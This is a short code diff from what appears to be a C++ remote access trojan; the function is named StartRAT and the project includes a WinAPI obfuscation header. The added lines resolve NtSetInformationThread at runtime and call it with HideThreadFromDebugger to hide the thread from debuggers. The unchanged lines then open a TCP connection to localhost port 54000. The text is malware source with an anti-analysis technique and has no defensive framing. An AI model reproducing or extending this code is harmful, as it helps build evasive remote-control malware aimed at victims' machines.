@@ -5,10 +5,16 @@
 #include "winapi_function_signatures.h"
 #include "winapi_obfuscation.h"
 
+#define HideThreadFromDebugger 0x11
+
 DWORD WINAPI StartRAT(LPVOID lpParam)
 {
+	GetCurrentThread_t GetCurrentThread_ptr = resolve_dynamically<GetCurrentThread_t>("GetCurrentThread");
+	resolve_dynamically<NtSetInformationThread_t>("NtSetInformationThread", NTDLL_STR)(GetCurrentThread_ptr(), HideThreadFromDebugger, 0, 0);
+
 	TCPClient* conn = new TCPClient("127.0.0.1", 54000);
 	conn->start_connection();
+
 
 	while (true)
 	{
